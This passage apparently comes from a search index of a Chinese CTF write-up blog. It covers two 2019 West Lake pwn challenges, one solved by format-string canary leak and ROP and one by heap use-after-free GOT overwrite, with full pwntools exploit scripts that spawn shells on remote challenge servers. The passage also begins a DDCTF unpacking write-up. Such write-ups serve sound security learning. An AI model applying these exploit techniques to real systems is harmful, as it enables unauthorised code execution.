WP\u665a\u70b9\u5199","title":"\u7b2c\u4e8c\u9898"},{"location":"CTF WP/pragyan-ctf2019-pwn\u90e8\u5206wp/#_3","text":"\u6e90\u7a0b\u5e8f\uff1a armoury","title":"\u7b2c\u4e09\u9898"},{"location":"CTF WP/\u897f\u6e56\u8bba\u5251pwn\u90e8\u5206writeup/","text":"\u8fd9\u6b21\u4e00\u5171\u67093\u9053pwn\u9898\uff0c\u51fa\u4e862\u9053\uff0c1\u9053\u662f\u7b80\u5355\u683c\u5f0f\u5316\u5b57\u7b26\u4e32+\u6808\u6ea2\u51fa\uff0c1\u9053\u662f\u7b80\u5355\u5806UAF\uff0c\u8fd8\u6709\u4e00\u9053\u4ee5\u4e3a\u662funlink\u7ed3\u679c\u5f00\u4e86PIE\u4e0d\u77e5\u9053\u600e\u4e48\u4e0b\u624b\u3002 \u9898\u76ee\u6e90\u6587\u4ef6\uff1a link \uff0c\u6587\u4ef6\u5939\u4e2d\u7684\u53ef\u80fd\u6253\u4e86patch\uff0c\u538b\u7f29\u5305\u4e2d\u7684\u662f\u539f\u9898\u3002 Story: \u00b6 IDA\u5206\u6790\uff0csub_400915\u51fd\u6570\u4e2d\u6709\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0csub4009A0\u51fd\u6570\u4e2d\u6709\u4e2a\u6808\u6ea2\u51fa\u6f0f\u6d1e\u3002 checksec\u5206\u6790\uff1a [*] '/home/ljb/ctf/xihu2019/story' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) \u53d1\u73b0\u6709canary\uff0c\u6ca1\u6709\u5f00PIE\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u53bbleak canary\uff08\u901a\u8fc7\u8fd9\u6b21\u9898\u53d1\u73b0\u4e86\u6bcf\u4e2a\u51fd\u6570\u7684canary\u90fd\u662f\u4e00\u6837\u7684\uff09\uff0c\u540c\u65f6leak\u51faread\u51fd\u6570\u5730\u5740\uff0c\u518d\u5229\u7528\u6808\u6ea2\u51fa\u8c03\u7528system(\"/bin/sh\")\u5373\u53efget shell\u3002 exp: \u00b6 from pwn import * io = remote ( \"ctf1.linkedbyx.com\" , 10465 ) #io=process(\"./story\") elf = ELF ( \"story\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) libc_read = libc . symbols [ 'read' ] puts_plt = elf . plt [ 'puts' ] read_got = elf . got [ 'read' ] pop_rdi = 0x400bd3 io . recvuntil ( \"ID:\" ) io . sendline ( \"%15$paaaaaa%10$s\" + p64 ( read_got )) io . recvuntil ( \"Hello \" ) message = io . recvuntil ( \" \\n \" ) canary = message [: 18 ] print canary canary = int ( canary , 16 ) read_addr = u64 ( message [ 24 : 30 ] + ' \\x00\\x00 ' ) print hex ( read_addr ) libcbase = read_addr - libc_read system_addr = libcbase + libc . symbols [ 'system' ] binsh_addr = libcbase + libc . search ( \"/bin/sh\" ) . next () io . recvuntil ( \"story: \\n \" ) io . sendline ( \"200\" ) io . recvuntil ( \"story: \\n \" ) payload = 'a' * 0x88 payload += p64 ( canary ) payload += 'a' * 8 payload += p64 ( pop_rdi ) payload += p64 ( binsh_addr ) payload += p64 ( system_addr ) io . sendline ( payload ) io . interactive () noinfoleak: \u00b6 checksec\u5206\u6790\uff1a [*] '/home/ljb/ctf/xihu2019/noinfoleak' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) IDA\u5206\u6790\uff0c\u7a0b\u5e8f\u5206\u4e3a3\u90e8\u5206\u529f\u80fd\uff0c1\uff1acreate\uff0c2\uff1adelete\uff0c3\uff1aedit\u3002\u5176\u4e2d\u5728delete\u90e8\u5206\u5b58\u5728\u4e00\u4e2aUAF\u6f0f\u6d1e\uff0c\u53ea\u91ca\u653e\u4e86\u5806\u7a7a\u95f4\u4f46\u6ca1\u6709\u628a\u5b58\u50a8\u6307\u9488\u7684\u5730\u65b9\u6e05\u96f6\u3002\u6240\u6709\u5806\u7684\u5730\u5740\u5b58\u50a8\u5728bss\u6bb5\uff0c\u4e0b\u9762\u79f0\u547c\u4e3ainfo\u6570\u7ec4\u3002 free(info[2 * v0]); // UAF \u56e0\u4e3a\u9632\u62a4\u4e3aPartial RELRO\uff0c\u800c\u4e14\u6ca1\u5f00PIE\uff0c\u56e0\u6b64\u8003\u8651\u4fee\u6539GOT\u8868\u6765get shell\u3002\u53c8\u56e0\u4e3aUAF\u6f0f\u6d1e\uff0c\u6240\u4ee5\u5e94\u8be5\u662f\u5229\u7528\u6539fd\uff0c\u8fbe\u6210\u4efb\u610f\u5730\u5740\u5199\u3002\u4e00\u5f00\u59cb\u601d\u8def\u9519\u4e86\uff0c\u60f3\u76f4\u63a5\u628a\u5806\u8fc1\u79fb\u5230GOT\u8868\u4e0a\uff0c\u7ed3\u679c\u53d1\u73b0\u5bf9size\u7684\u9a8c\u8bc1\u5bfc\u81f4\u51fa\u9519\u3002\u540e\u6765\u60f3\u4e86\u60f3\u6362\u6210\u628a\u5806\u8fc1\u79fb\u5230bss\u6bb5\u4e0a\u3002 \u601d\u8def\uff1a \u00b6 \u9996\u5148\uff0c\u7533\u8bf7\u51e0\u4e2a\u5806\uff0c\u8fd9\u91cc\u5e94\u8be5\u662f\u8981\u81f3\u5c113\u4e2a\uff0c\u6bd4\u8d5b\u65f6\u6ca1\u8003\u8651\u76f4\u63a5\u7533\u8bf7\u4e865\u4e2a\uff0c\u4e0d\u5f71\u54cd\u3002\u7136\u540e\u518d\u7533\u8bf7\u4e00\u4e2a\u5927\u5c0f\u4e3a0x18\uff08\u5927\u4e8e0X18\u4e5f\u53ef\u4ee5\uff09\u7684\u5806A\u3002\u4e4b\u540edelete(A)\uff0c\u5229\u7528UAF\uff0c\u628aA\u7684fd\u6539\u6210info\u9996\u5730\u5740\u3002\u7136\u540e\u91cd\u65b0\u628aA\u7533\u8bf7\u56de\u6765\uff0c\u8fd9\u65f6A\u539f\u6765\u6240\u5728\u7684fastbin\u7684fd\u6307\u9488\u4f1a\u6307\u5411info\u9996\u5730\u5740\u3002\u518d\u7533\u8bf7\u4e00\u4e2a0x18\u5927\u5c0f\u7684\u5730\u5740\uff0c\u5c31\u4f1a\u628ainfo\u5f00\u59cb\u7684\u4e00\u5757\u7a7a\u95f4\u5f53\u4f5c\u5806B\u5206\u914d\u51fa\u53bb\u3002\uff08\u8fd9\u91cc\u8981\u6ce8\u610f\u5806B\u7684size\u8981\u8bbe\u597d\uff0c\u5c31\u662finfo[1]\uff0c\u8fd9\u91cc\u5e94\u8bbe\u4e3a0x31\uff0c\u5426\u5219\u4f1a\u62a5\u9519\uff09 \u63a5\u4e0b\u6765\u5bf9\u5806B\u7684\u5185\u5bb9\u4fee\u6539\uff0c\u76f8\u5f53\u4e8e\u5bf9info\u8fdb\u884c\u4fee\u6539\uff0c\u6240\u4ee5\u6211\u4eec\u628ainfo[2]\u6539\u4e3afree_got\uff0cinfo[4]\u6539\u4e3aread_got\uff0c\u63a5\u4e0b\u6765\u8c03\u7528edit\u51fd\u6570\uff0c\u4fee\u6539index\u4e3a1\u7684\u5806\uff0c\u8fd9\u4e2a\u5806\u7684\u5730\u5740\u5b58\u5728info[2]\uff0c\u5219\u53ef\u4ee5\u8fbe\u6210\u628afree_got\u6539\u4e3aputs_plt\uff0c\u7136\u540e\u8c03\u7528delete(2)\uff0c\u8fbe\u6210puts(read_got)\uff0c\u5373\u53ef\u6cc4\u9732read\u7684\u5730\u5740\uff0c\u8ba1\u7b97\u51falibc\u504f\u79fb\u3002 \u4e4b\u540e\u5c31\u7b80\u5355\u4e86\uff0c\u6545\u6280\u91cd\u65bd\uff0c\u628afree_got\u6539\u4e3asystem\uff0cinfo[4]\u4e2d\u653e\"/bin/sh\"\u7684\u5730\u5740\uff0c\u518d\u8c03\u7528delete(2)\uff0c\u8fbe\u6210system(\"/bin/sh\")\uff0cget shell\u6210\u529f\uff01 exp: \u00b6 from pwn import * #io=process(\"./noinfoleak\") io = remote ( \"ctf3.linkedbyx.com\" , 11106 ) elf = ELF ( \"noinfoleak\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) def create ( size , content ): io . recvuntil ( \">\" ) io . send ( \"1\" ) io . recvuntil ( \">\" ) io . sendline ( str ( size )) io . recvuntil ( \">\" ) io . send ( content ) def delete ( index ): io . recvuntil ( \">\" ) io . sendline ( \"2\" ) io . recvuntil ( \">\" ) io . sendline ( str ( index )) def edit ( index , content ): io . recvuntil ( \">\" ) io . sendline ( \"3\" ) io . recvuntil ( \">\" ) io . sendline ( str ( index )) io . recvuntil ( \">\" ) io . send ( content ) free_got = elf . got [ 'free' ] read_got = elf . got [ 'read' ] puts_plt = elf . plt [ 'puts' ] bss = 0x6010a0 #gdb.attach(io) create ( 49 , 'A' * 49 ) #0 create ( 8 , 'A' * 8 ) #1 create ( 8 , 'A' * 8 ) #2 create ( 8 , 'A' * 8 ) #3 create ( 8 , 'A' * 8 ) #4 create ( 0x18 , 'A' * 0x18 ) #5 #delete(4) delete ( 5 ) edit ( 5 , p64 ( bss )) create ( 0x18 , 'a' * 0x18 ) #6=old 5 create ( 0x18 , p64 ( free_got ) + p64 ( 49 ) + p64 ( read_got )) #7,info[2]=free_got edit ( 1 , p64 ( puts_plt )) #free->puts delete ( 2 ) #puts(read_got) read_addr = u64 ( io . recvuntil ( \" \\n \" )[: - 1 ] + ' \\x00\\x00 ' ) print hex ( read_addr ) libcbase = read_addr - libc . symbols [ 'read' ] system_addr = libcbase + libc . symbols [ 'system' ] binsh_addr = libcbase + libc . search ( \"/bin/sh\" ) . next () edit ( 7 , p64 ( free_got ) + p64 ( 49 ) + p64 ( binsh_addr )) #info[2]=free_got,info[4]=&\"/bin/sh\" edit ( 1 , p64 ( system_addr )) #free->system delete ( 2 ) #system(\"/bin/sh\") io . interactive () \u897f\u6e562019\u540e\u8bb0\uff1a \u00b6 \u7ec8\u4e8e\u4e0d\u7528\u80cc\u9505\u4e86\uff0c\u7b97\u662f\u7b2c\u4e00\u6b21\u5728\u6709\u70b9\u540d\u6c14\u7684\u6b63\u5f0f\u6bd4\u8d5b\u4e2d\u505a\u51fapwn\u9898\uff0c\u800c\u4e14\u505a\u51fa\u4e86\u8fd8\u5728\u5b66\u7684\u5806\u3002\u4f46\u662f\u8fd9\u6b21\u6bd4\u8d5b\u9898\u8fd8\u662f\u592a\u7b80\u5355\u4e86\uff0c\u8fd8\u6709\u5f88\u957f\u7684\u8def\u8981\u8d70\uff0c\u7ee7\u7eed\u52a0\u6cb9\u5427\uff01","title":"\u897f\u6e56\u8bba\u5251pwn\u90e8\u5206writeup"},{"location":"CTF WP/\u897f\u6e56\u8bba\u5251pwn\u90e8\u5206writeup/#story","text":"IDA\u5206\u6790\uff0csub_400915\u51fd\u6570\u4e2d\u6709\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0csub4009A0\u51fd\u6570\u4e2d\u6709\u4e2a\u6808\u6ea2\u51fa\u6f0f\u6d1e\u3002 checksec\u5206\u6790\uff1a [*] '/home/ljb/ctf/xihu2019/story' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) \u53d1\u73b0\u6709canary\uff0c\u6ca1\u6709\u5f00PIE\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u53bbleak canary\uff08\u901a\u8fc7\u8fd9\u6b21\u9898\u53d1\u73b0\u4e86\u6bcf\u4e2a\u51fd\u6570\u7684canary\u90fd\u662f\u4e00\u6837\u7684\uff09\uff0c\u540c\u65f6leak\u51faread\u51fd\u6570\u5730\u5740\uff0c\u518d\u5229\u7528\u6808\u6ea2\u51fa\u8c03\u7528system(\"/bin/sh\")\u5373\u53efget shell\u3002","title":"Story:"},{"location":"CTF WP/\u897f\u6e56\u8bba\u5251pwn\u90e8\u5206writeup/#exp","text":"from pwn import * io = remote ( \"ctf1.linkedbyx.com\" , 10465 ) #io=process(\"./story\") elf = ELF ( \"story\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) libc_read = libc . symbols [ 'read' ] puts_plt = elf . plt [ 'puts' ] read_got = elf . got [ 'read' ] pop_rdi = 0x400bd3 io . recvuntil ( \"ID:\" ) io . sendline ( \"%15$paaaaaa%10$s\" + p64 ( read_got )) io . recvuntil ( \"Hello \" ) message = io . recvuntil ( \" \\n \" ) canary = message [: 18 ] print canary canary = int ( canary , 16 ) read_addr = u64 ( message [ 24 : 30 ] + ' \\x00\\x00 ' ) print hex ( read_addr ) libcbase = read_addr - libc_read system_addr = libcbase + libc . symbols [ 'system' ] binsh_addr = libcbase + libc . search ( \"/bin/sh\" ) . next () io . recvuntil ( \"story: \\n \" ) io . sendline ( \"200\" ) io . recvuntil ( \"story: \\n \" ) payload = 'a' * 0x88 payload += p64 ( canary ) payload += 'a' * 8 payload += p64 ( pop_rdi ) payload += p64 ( binsh_addr ) payload += p64 ( system_addr ) io . sendline ( payload ) io . interactive ()","title":"exp:"},{"location":"CTF WP/\u897f\u6e56\u8bba\u5251pwn\u90e8\u5206writeup/#noinfoleak","text":"checksec\u5206\u6790\uff1a [*] '/home/ljb/ctf/xihu2019/noinfoleak' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) IDA\u5206\u6790\uff0c\u7a0b\u5e8f\u5206\u4e3a3\u90e8\u5206\u529f\u80fd\uff0c1\uff1acreate\uff0c2\uff1adelete\uff0c3\uff1aedit\u3002\u5176\u4e2d\u5728delete\u90e8\u5206\u5b58\u5728\u4e00\u4e2aUAF\u6f0f\u6d1e\uff0c\u53ea\u91ca\u653e\u4e86\u5806\u7a7a\u95f4\u4f46\u6ca1\u6709\u628a\u5b58\u50a8\u6307\u9488\u7684\u5730\u65b9\u6e05\u96f6\u3002\u6240\u6709\u5806\u7684\u5730\u5740\u5b58\u50a8\u5728bss\u6bb5\uff0c\u4e0b\u9762\u79f0\u547c\u4e3ainfo\u6570\u7ec4\u3002 free(info[2 * v0]); // UAF \u56e0\u4e3a\u9632\u62a4\u4e3aPartial RELRO\uff0c\u800c\u4e14\u6ca1\u5f00PIE\uff0c\u56e0\u6b64\u8003\u8651\u4fee\u6539GOT\u8868\u6765get shell\u3002\u53c8\u56e0\u4e3aUAF\u6f0f\u6d1e\uff0c\u6240\u4ee5\u5e94\u8be5\u662f\u5229\u7528\u6539fd\uff0c\u8fbe\u6210\u4efb\u610f\u5730\u5740\u5199\u3002\u4e00\u5f00\u59cb\u601d\u8def\u9519\u4e86\uff0c\u60f3\u76f4\u63a5\u628a\u5806\u8fc1\u79fb\u5230GOT\u8868\u4e0a\uff0c\u7ed3\u679c\u53d1\u73b0\u5bf9size\u7684\u9a8c\u8bc1\u5bfc\u81f4\u51fa\u9519\u3002\u540e\u6765\u60f3\u4e86\u60f3\u6362\u6210\u628a\u5806\u8fc1\u79fb\u5230bss\u6bb5\u4e0a\u3002","title":"noinfoleak:"},{"location":"CTF WP/\u897f\u6e56\u8bba\u5251pwn\u90e8\u5206writeup/#_1","text":"\u9996\u5148\uff0c\u7533\u8bf7\u51e0\u4e2a\u5806\uff0c\u8fd9\u91cc\u5e94\u8be5\u662f\u8981\u81f3\u5c113\u4e2a\uff0c\u6bd4\u8d5b\u65f6\u6ca1\u8003\u8651\u76f4\u63a5\u7533\u8bf7\u4e865\u4e2a\uff0c\u4e0d\u5f71\u54cd\u3002\u7136\u540e\u518d\u7533\u8bf7\u4e00\u4e2a\u5927\u5c0f\u4e3a0x18\uff08\u5927\u4e8e0X18\u4e5f\u53ef\u4ee5\uff09\u7684\u5806A\u3002\u4e4b\u540edelete(A)\uff0c\u5229\u7528UAF\uff0c\u628aA\u7684fd\u6539\u6210info\u9996\u5730\u5740\u3002\u7136\u540e\u91cd\u65b0\u628aA\u7533\u8bf7\u56de\u6765\uff0c\u8fd9\u65f6A\u539f\u6765\u6240\u5728\u7684fastbin\u7684fd\u6307\u9488\u4f1a\u6307\u5411info\u9996\u5730\u5740\u3002\u518d\u7533\u8bf7\u4e00\u4e2a0x18\u5927\u5c0f\u7684\u5730\u5740\uff0c\u5c31\u4f1a\u628ainfo\u5f00\u59cb\u7684\u4e00\u5757\u7a7a\u95f4\u5f53\u4f5c\u5806B\u5206\u914d\u51fa\u53bb\u3002\uff08\u8fd9\u91cc\u8981\u6ce8\u610f\u5806B\u7684size\u8981\u8bbe\u597d\uff0c\u5c31\u662finfo[1]\uff0c\u8fd9\u91cc\u5e94\u8bbe\u4e3a0x31\uff0c\u5426\u5219\u4f1a\u62a5\u9519\uff09 \u63a5\u4e0b\u6765\u5bf9\u5806B\u7684\u5185\u5bb9\u4fee\u6539\uff0c\u76f8\u5f53\u4e8e\u5bf9info\u8fdb\u884c\u4fee\u6539\uff0c\u6240\u4ee5\u6211\u4eec\u628ainfo[2]\u6539\u4e3afree_got\uff0cinfo[4]\u6539\u4e3aread_got\uff0c\u63a5\u4e0b\u6765\u8c03\u7528edit\u51fd\u6570\uff0c\u4fee\u6539index\u4e3a1\u7684\u5806\uff0c\u8fd9\u4e2a\u5806\u7684\u5730\u5740\u5b58\u5728info[2]\uff0c\u5219\u53ef\u4ee5\u8fbe\u6210\u628afree_got\u6539\u4e3aputs_plt\uff0c\u7136\u540e\u8c03\u7528delete(2)\uff0c\u8fbe\u6210puts(read_got)\uff0c\u5373\u53ef\u6cc4\u9732read\u7684\u5730\u5740\uff0c\u8ba1\u7b97\u51falibc\u504f\u79fb\u3002 \u4e4b\u540e\u5c31\u7b80\u5355\u4e86\uff0c\u6545\u6280\u91cd\u65bd\uff0c\u628afree_got\u6539\u4e3asystem\uff0cinfo[4]\u4e2d\u653e\"/bin/sh\"\u7684\u5730\u5740\uff0c\u518d\u8c03\u7528delete(2)\uff0c\u8fbe\u6210system(\"/bin/sh\")\uff0cget shell\u6210\u529f\uff01","title":"\u601d\u8def\uff1a"},{"location":"CTF WP/\u897f\u6e56\u8bba\u5251pwn\u90e8\u5206writeup/#exp_1","text":"from pwn import * #io=process(\"./noinfoleak\") io = remote ( \"ctf3.linkedbyx.com\" , 11106 ) elf = ELF ( \"noinfoleak\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) def create ( size , content ): io . recvuntil ( \">\" ) io . send ( \"1\" ) io . recvuntil ( \">\" ) io . sendline ( str ( size )) io . recvuntil ( \">\" ) io . send ( content ) def delete ( index ): io . recvuntil ( \">\" ) io . sendline ( \"2\" ) io . recvuntil ( \">\" ) io . sendline ( str ( index )) def edit ( index , content ): io . recvuntil ( \">\" ) io . sendline ( \"3\" ) io . recvuntil ( \">\" ) io . sendline ( str ( index )) io . recvuntil ( \">\" ) io . send ( content ) free_got = elf . got [ 'free' ] read_got = elf . got [ 'read' ] puts_plt = elf . plt [ 'puts' ] bss = 0x6010a0 #gdb.attach(io) create ( 49 , 'A' * 49 ) #0 create ( 8 , 'A' * 8 ) #1 create ( 8 , 'A' * 8 ) #2 create ( 8 , 'A' * 8 ) #3 create ( 8 , 'A' * 8 ) #4 create ( 0x18 , 'A' * 0x18 ) #5 #delete(4) delete ( 5 ) edit ( 5 , p64 ( bss )) create ( 0x18 , 'a' * 0x18 ) #6=old 5 create ( 0x18 , p64 ( free_got ) + p64 ( 49 ) + p64 ( read_got )) #7,info[2]=free_got edit ( 1 , p64 ( puts_plt )) #free->puts delete ( 2 ) #puts(read_got) read_addr = u64 ( io . recvuntil ( \" \\n \" )[: - 1 ] + ' \\x00\\x00 ' ) print hex ( read_addr ) libcbase = read_addr - libc . symbols [ 'read' ] system_addr = libcbase + libc . symbols [ 'system' ] binsh_addr = libcbase + libc . search ( \"/bin/sh\" ) . next () edit ( 7 , p64 ( free_got ) + p64 ( 49 ) + p64 ( binsh_addr )) #info[2]=free_got,info[4]=&\"/bin/sh\" edit ( 1 , p64 ( system_addr )) #free->system delete ( 2 ) #system(\"/bin/sh\") io . interactive ()","title":"exp:"},{"location":"CTF WP/\u897f\u6e56\u8bba\u5251pwn\u90e8\u5206writeup/#2019","text":"\u7ec8\u4e8e\u4e0d\u7528\u80cc\u9505\u4e86\uff0c\u7b97\u662f\u7b2c\u4e00\u6b21\u5728\u6709\u70b9\u540d\u6c14\u7684\u6b63\u5f0f\u6bd4\u8d5b\u4e2d\u505a\u51fapwn\u9898\uff0c\u800c\u4e14\u505a\u51fa\u4e86\u8fd8\u5728\u5b66\u7684\u5806\u3002\u4f46\u662f\u8fd9\u6b21\u6bd4\u8d5b\u9898\u8fd8\u662f\u592a\u7b80\u5355\u4e86\uff0c\u8fd8\u6709\u5f88\u957f\u7684\u8def\u8981\u8d70\uff0c\u7ee7\u7eed\u52a0\u6cb9\u5427\uff01","title":"\u897f\u6e562019\u540e\u8bb0\uff1a"},{"location":"CTF WP/\u901a\u8fc7DDCTF\u4e24\u9053\u9006\u5411\u9898\u7ec3\u4e60\u8131\u58f3/","text":"\u660e\u5929\u51fa\u53d1\u53bb\u6253\u897f\u6e56\u8bba\u5251\u7ebf\u4e0b\u4e86\uff0c\u7136\u540e\u4eca\u5929\u5b88\u671b\u53c8\u51fa\u4e86PVE\uff0c\u5fc3\u6709\u70b9\u4e0d\u5b9a\uff0c\u5565\u90fd\u4e0d\u60f3\u505a\u3002\u3002\u3002\u4e0d\u60f3\u6d6a\u8d39\u65f6\u95f4\uff0c\u521a\u597d\u6700\u8fd1\u505a\u4e86DDCTF\u7684\u524d\u4e24\u9053\u9006\u5411\u90fd\u662f\u8131\u58f3\u7684\uff0c\u624b\u52a8\u8131\u58f3\u8fd8\u6ca1\u8bd5\u8fc7\uff0c\u5c31\u8bb0\u4e0b\u6765\u3002\uff08\u5176\u5b9e\u662f\u56e0\u4e3a\u7b2c\u4e00\u9898UPX\u5de5\u5177\u8131\u58f3\u8131\u51fa\u6765\u4e0d\u597d\u6240\u4ee5\u624b\u52a8orz\uff09 \u524d\u7f6e\u5de5\u4f5c\uff1a \u00b6 \u4e4b\u524d\u8fd8\u6ca1\u7528\u8fc7IDA\u5728windows\u4e0a\u8c03\u8bd5\uff0c\u90fd\u662f\u7528OD\u6216\u8005xdbg\u3002\u8fd9\u6b21\u672c\u6765\u4e5f\u60f3\u5728OD\u8131\u7684\uff0c\u7ed3\u679c\u592a\u83dc\u4e86\u4e00\u8fdb\u53bb\u5c31\u4e0d\u77e5\u9053\u662f\u4ec0\u4e48\u60c5\u51b5\u4e86\u3002\u3002\u3002\u60f3\u7740\u8fd8\u662fIDA\u8212\u670d\uff0c\u8d81\u673a\u5b66\u4e00\u4e0b\u3002\u7ed3\u5408IDA\u5728linux\u7684\u8c03\u8bd5\u8981\u5f00\u8c03\u8bd5\u8fdb\u7a0b\uff0c\u5728IDA\u7684\u6587\u4ef6\u5939\u4e0b\u641c\u5230\u4e86\u8fd9\u4e2a\uff1a \u8fd9\u9898\u662f32\u4f4d\u7684\uff0c\u6240\u4ee5\u8fd0\u884c\u6700\u4e0a\u9762\u7684\u90a3\u4e2a\u3002\u7136\u540e\u5728IDA\u9009\u62e9Debugger->Select debugger->Local Windows debugger\u3002 reverse1_final\uff1a \u00b6 \u5148IDA\u5206\u6790\uff0c\u6bb5\u540d\u79f0\u53ebUPX1\u3001UPX2\uff0c\u56e0\u6b64\u5f88\u5927\u53ef\u80fd\u662fUPX\u58f3\u3002PEID\u67e5\u4e86\u4e00\u4e0b\u4e5f\u786e\u5b9e\u662fUPX\u58f3\u3002\u524d\u9762\u4e00\u5806\u538b\u7f29\u7684\u4fe1\u606f\uff0c\u6ca1\u4ec0\u4e48\u610f\u4e49\u3002\u76f4\u63a5\u770b\u540e\u9762\u3002 \u4e00\u5f00\u59cb\u5c31\u662f\u4e2apusha\uff0c\u6240\u4ee5\u53ef\u4ee5\u7528esp\u5b9a\u5f8b\u8131\u58f3\uff0c\u53ef\u4ee5\u5728pusha\u540e\uff0c\u5bf9\u5f53\u524desp\u6240\u5728\u4f4d\u7f6e\u4e0b\u786c\u4ef6\u8bbf\u95ee\u65ad\u70b9\u3002F9\u6267\u884c\u3002 F9\u5b8c\u8df3\u52300x917C47\uff0c\u540e\u9762\u6709\u4e2a\u5c0f\u5faa\u73af\uff0c\u6240\u4ee5\u57280x917C51\u4e0b\u4e2a\u65ad\u70b9\u518dF9\uff0c\u5c31\u51fa\u6765\u4e86\u3002\u4e00\u76f4\u5355\u6b65\uff0c\u770b\u5230\u8fd0\u884c\u523012AA\u5c31\u505c\u4e86\uff0c\u770b\u63a7\u5236\u53f0\u7b49\u5f85\u8f93\u5165\uff0c\u56e0\u6b64\u8fd9\u4e2a\u5e94\u8be5\u662f\u4e3b\u8981\u8fd0\u884c\u7a0b\u5e8f\u3002\u8ddf\u8fdb\u53bb\u770b\uff0c\u53d1\u73b0\u80fdF5\u4e86\uff0c\u800c\u4e14\u6709\u63d0\u793a\u8f93\u51fa\u548c\u8bfb\u5165\u6570\u636e\uff0c\u56e0\u6b64\u8fd9\u4e2a\u5927\u6982\u7387\u662fmain\u51fd\u6570\u3002\u4f46\u662f\u53ea\u6709printf\u548cscanf\uff0c\u611f\u89c9\u5206\u6790\u4e0d\u5b8c\u5168\uff0c\u518d\u5230\u6c47\u7f16\u770b\u770b\u3002 \u770b\u4e0a\u53bb\u4e0d\u662f\u6b63\u5e38\u7684\u7ed3\u5c3e\u3002\u518d\u5f80\u540e\u770b\u8fd8\u6709\u4e00\u4e9b\u96f6\u96f6\u6563\u6563\u7684\u7a0b\u5e8f\u3002\u5bf9\u7a0b\u5e8f\u788e\u7247\u8fdb\u884cC\u64cd\u4f5c\uff0c\u7ec4\u5408\u6210\u7a0b\u5e8f\u5757\u65b9\u4fbf\u540e\u9762\u64cd\u4f5c\u3002\u56e0\u6b64\u628a\u5f53\u524d\u51fd\u6570\u548c\u540e\u9762\u7684\u90e8\u5206\u51fd\u6570U\u6389\uff0c\u518d\u91cd\u65b0P\u4e00\u4e0b\u8fdb\u884c\u51fd\u6570\u5206\u6790\uff0cF5\u770b\u4e0b\uff0c\u5c31\u80fd\u5f97\u5230\u770b\u4e0a\u53bb\u8f83\u4e3a\u6b63\u5e38\u7684\u7a0b\u5e8f\u3002 \u770b\u4e0a\u53bb\u4e3b\u8981\u7684\u8fd0\u7b97\u90fd\u5728DD1000\u90a3\u4e2a\u51fd\u6570\uff0c\u8fdb\u53bb\u770b\u770b\u3002\u70b9\u8fdb\u53bb\u770b\u4ec0\u4e48\u90fd\u6ca1\u6709\uff0c\u5230\u6c47\u7f16\u5c42\u9762\u770b\u770b\u3002\u770b\u5230\u4e5f\u662f\u96f6\u96f6\u6563\u6563\u7684\u7a0b\u5e8f\u3002C\u4e00\u4e0b\u76f4\u63a5\u5bf9DD1000\u51fd\u6570\u8fdb\u884cF5\uff0c\u76f4\u63a5\u80fd\u5206\u6790\u51fa\u6765\u4e86\u3002 \u540e\u9762\u90fd\u662f\u975e\u5e38\u7b80\u5355\u7684\u903b\u8f91\u4e86\u3002\u5c06\u8f93\u5165\u548c\u5e38\u91cf\u8868\u64cd\u4f5c\u4e00\u4e0b\uff0c\u7136\u540e\u548cDDCTF{reverseME}\u8fdb\u884c\u6bd4\u8f83\uff0c\u6b63\u786e\u5c31\u8fc7check\u4e86\u3002\u53ea\u8981\u9006\u8fd0\u7b97\u4e00\u4e0b\u5c31\u80fd\u5f97\u5230\u6b63\u786e\u8f93\u5165\uff0c\u5373flag\u3002 \u811a\u672c\uff1a flag = \"DDCTF{reverseME}\" constant = [ 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0x00 , 0xBA , 0xA5 , 0x0D , 0x34 , 0x45 , 0x5A , 0xF2 , 0xCB , 0xFF , 0xFF , 0xFF , 0xFF , 0xFF , 0xFF , 0xFF , 0xFF , 0xFE , 0xFF , 0xFF , 0xFF , 0x01 , 0x00 , 0x00 , 0x00 , 0x7E , 0x7D , 0x7C , 0x7B , 0x7A , 0x79 , 0x78 , 0x77 , 0x76 , 0x75 , 0x74 , 0x73 , 0x72 , 0x71 , 0x70 , 0x6F , 0x6E , 0x6D , 0x6C , 0x6B , 0x6A , 0x69 , 0x68 , 0x67 , 0x66 , 0x65 , 0x64 , 0x63 , 0x62 , 0x61 , 0x60 , 0x5F , 0x5E , 0x5D , 0x5C , 0x5B , 0x5A , 0x59 , 0x58 , 0x57 , 0x56 , 0x55 , 0x54 , 0x53 , 0x52 , 0x51 , 0x50 , 0x4F , 0x4E , 0x4D , 0x4C , 0x4B , 0x4A , 0x49 , 0x48 , 0x47 , 0x46 , 0x45 , 0x44 , 0x43 , 0x42 , 0x41 , 0x40 , 0x3F , 0x3E , 0x3D , 0x3C , 0x3B , 0x3A , 0x39 , 0x38 , 0x37 , 0x36 , 0x35 , 0x34 , 0x33 , 0x32 , 0x31 , 0x30 , 0x2F , 0x2E , 0x2D , 0x2C , 0x2B , 0x2A , 0x29 , 0x28 , 0x27 , 0x26 , 0x25 , 0x24 , 0x23 , 0x22 , 0x21 , 0x20 , 0x00 , 0x01 , 0x00 , 0x00 , 0x00 , 0x00 , 0x1B , 0xD5 , 0x00 ] print len ( constant ) origin = \"\" for i in flag : origin += chr ( constant [ ord ( i )]) print origin reverse2_final: \u00b6 peid\u67e5\u4e00\u4e0b\uff0c\u53d1\u73b0\u53c8\u52a0\u4e86\u58f3\u3002\u8fd9\u6b21\u662fASPack\u58f3\u3002 